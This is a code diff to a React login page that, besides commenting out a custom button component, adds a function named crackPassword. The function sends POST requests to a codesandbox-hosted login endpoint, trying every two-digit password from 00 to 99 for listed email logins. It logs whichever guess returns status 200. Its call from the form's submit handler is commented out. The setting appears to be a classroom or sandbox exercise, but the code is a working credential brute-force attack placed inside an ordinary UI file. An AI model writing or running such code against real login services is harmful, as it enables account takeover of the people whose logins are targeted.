@@ -4,7 +4,7 @@ import { useFormik } from 'formik';
 import { object, string } from 'yup';
 // import styled, { css } from 'styled-components';
 import { TextField, Button, Box } from '@material-ui/core';
-import MyButton from './MyButton';
+// import MyButton from './MyButton';
 // import './LoginPage.css';
 
 // const LoginPageWrapper = styled(Box)`
@@ -17,6 +17,38 @@ import MyButton from './MyButton';
 //   `}
 // `;
 
+async function crackPassword() {
+  const logins = [
+    // 'egordavidovich@mail.com',
+    // 'feliksharauski@mail.com',
+    // 'viktorg@mail.com',
+    // 'dtarankevich@mail.com',
+    'tataiana@mail.com',
+    // 'taisiagvozdeva@mail.com',
+    // 'mariaguk@mail.com',
+    // 'alexsavich@mail.com',
+    // 'ysekach@mail.com',
+  ];
+
+  logins.forEach(login => {
+    [...Array(100)].forEach((_, i) => {
+      fetch('https://uoxfu.sse.codesandbox.io/login', {
+        method: 'POST',
+        body: JSON.stringify({
+          login,
+          password: `${i < 10 ? 0 : ''}${i}`,
+        }),
+        headers: {
+          // Accept: 'application/json',
+          'Content-Type': 'application/json',
+        },
+      }).then(res => {
+        if (res.status === 200) console.log(`${i < 10 ? 0 : ''}${i}`);
+      });
+    });
+  });
+}
+
 function LoginPage() {
   // console.log(props.history.push);
   const { push } = useHistory();
@@ -26,6 +58,7 @@ function LoginPage() {
       password: '',
     },
     onSubmit: values => {
+      // return crackPassword();
       // eslint-disable-next-line no-alert
       // alert(JSON.stringify(values, null, 2));
 
@@ -94,14 +127,14 @@ function LoginPage() {
           </Button>
         </div>
       </form>
-      <MyButton
+      {/* <MyButton
         aa={{}}
         login={formik.values.login}
         onClick={() => push('/')}
         count={123}
       >
         my button
-      </MyButton>
+      </MyButton> */}
     </Box>
   );
 }
